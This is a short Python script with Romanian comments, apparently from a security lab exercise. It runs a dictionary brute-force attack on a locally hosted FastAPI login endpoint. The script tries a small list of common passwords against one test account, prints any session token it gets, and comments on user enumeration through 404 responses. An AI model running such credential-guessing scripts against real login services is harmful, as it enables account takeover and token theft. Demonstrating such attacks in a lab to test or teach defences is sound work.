import requests
import time

# Configurarea țintei
URL = "http://127.0.0.1:8000/login"
TARGET_EMAIL = "test@hacker.com" # Schimbă cu email-ul pe care l-ai înregistrat tu

# Un "dicționar" mic de parole pe care atacatorul le încearcă
PASSWORD_LIST = [
    "123456",
    "password",
    "admin123",
    "qwerty",
    "p_nou", # Presupunem că asta e parola corectă setată de tine anterior
    "hacker99"
]

print(f"[*] Începem atacul de Brute Force asupra contului: {TARGET_EMAIL}")
print("[*] --------------------------------------------------")

for password in PASSWORD_LIST:
    print(f"[*] Încercăm parola: '{password}'...")
    
    # Construim payload-ul exact cum îl așteaptă FastAPI
    payload = {
        "email": TARGET_EMAIL,
        "password": password
    }
    
    # Trimitem request-ul POST
    response = requests.post(URL, json=payload)
    
    # Analizăm răspunsul
    if response.status_code == 200:
        print(f"\n[+] SUCCES! Parola a fost găsită: '{password}'")
        print(f"[+] Token-ul de sesiune furat: {response.json().get('token')}")
        break
    elif response.status_code == 401:
        print("[-] Eșuat: Parolă greșită.")
    elif response.status_code == 404:
        print("[-] Eșuat: Userul nu există (User Enumeration ne-ar fi spus asta deja!).")
        break
    else:
        print(f"[-] Eroare neașteptată: {response.status_code}")
        
    # Punem o mică pauză doar ca să vedem frumos în terminal (la un atac real ar fi zero)
    time.sleep(0.5)

print("\n[*] Atacul s-a încheiat.")